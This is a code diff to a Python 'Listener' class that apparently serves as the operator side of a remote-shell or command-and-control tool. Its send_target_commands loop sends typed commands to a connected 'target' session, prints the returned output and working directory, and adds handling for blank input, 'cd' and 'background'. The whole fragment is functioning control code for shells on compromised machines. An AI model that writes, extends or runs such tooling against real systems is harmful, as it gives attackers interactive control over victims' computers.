@@ -51,19 +51,26 @@ class Listener:
     async def send_target_commands(self, target):
         conn = self.sessions[target]
         conn.send(str.encode(' '))
-        cwd_bytes = await self.read_command_output(conn)
-        cwd = str(cwd_bytes, 'utf-8')
-        print('(inside) %s' % cwd, end='')
         while True:
             try:
+                cwd_bytes = await self.read_command_output(conn)
+                cwd = str(cwd_bytes, 'utf-8')
+                print(cwd, end='')
+
                 cmd = await ainput()
-                if cmd == 'background':
-                    break
-                elif len(str.encode(cmd)) > 0:
+                if not cmd:
+                    cmd = ' '
+                if len(str.encode(cmd)) > 0:
                     conn.send(str.encode(cmd))
                     cmd_output = await self.read_command_output(conn)
                     client_response = str(cmd_output, 'utf-8')
                     print(client_response, end='')
+
+                    if cmd == 'cd':
+                        continue
+                    if cmd == 'background':
+                        print('\n')
+                        break
             except Exception as e:
                 self.log.console('Connection was lost %s' % e, 'red')
                 break
